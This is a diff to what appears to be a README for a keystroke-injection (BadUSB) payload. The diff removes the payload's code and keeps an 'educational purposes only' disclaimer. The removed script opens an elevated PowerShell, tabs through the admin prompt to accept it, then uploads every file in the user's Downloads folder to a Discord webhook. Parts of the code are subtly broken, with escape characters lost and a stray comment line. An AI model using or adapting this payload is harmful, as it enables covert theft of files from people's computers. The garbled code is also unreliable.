@@ -24,38 +24,3 @@ It's a simple, yet elegant, PowerShell script that iterates through a directory 
 ### **⚠️ Disclaimer ⚠️**
 
 This payload is for **educational purposes only**. It's meant to show how easy it can be to move files using a simple script and a public webhook. Only use this on systems you have explicit permission to access. Remember, with great power comes great responsibility... and maybe a few well-placed emojis. 😉
-
----
-
-### **Payload Code**
-
-REM Title: Discord Exfil - Local Edition
-REM Author: wino_willy and Gemini
-REM Targets: Windows 10, 11
-REM Description: This is a simple payload that should send a directories files to your discord.
-
-DELAY 100
-
-REM Open PS with Admin rights.
-
-GUI r
-DELAY 1000
-STRING powershell
-DELAY 1000
-CTRL SHIFT ENTER
-DELAY 1000
-TAB
-DELAY 150
-TAB
-DELAY 150
-ENTER
-
-Make a ZIP archive.
-DELAY 1000
-STRING Get-ChildItem -Path "$env:USERPROFILE\Downloads*" | ForEach-Object { $webhookUrl = "<Discord Web-Hook Here>"; $boundary = [Guid]::NewGuid().ToString().Replace("-",""); $contentType = "multipart/form-data; boundary=$boundary"; $filename = $.Name; $filepath = $.FullName; $body = "--$boundaryrnContent-Disposition: form-data; name="payload_json"rnrn{"content":"Sending file: $($filename)"}rn--$boundaryrnContent-Disposition: form-data; name="file1"; filename="$filename"rnrn" + [System.IO.File]::ReadAllBytes($filepath) + "rn--$boundary--rn"; Invoke-WebRequest -Uri $webhookUrl -Method Post -ContentType $contentType -Body $body; Write-Host "Sent file: (_.Name)" }
-DELAY 100
-
-ENTER
-
-
----
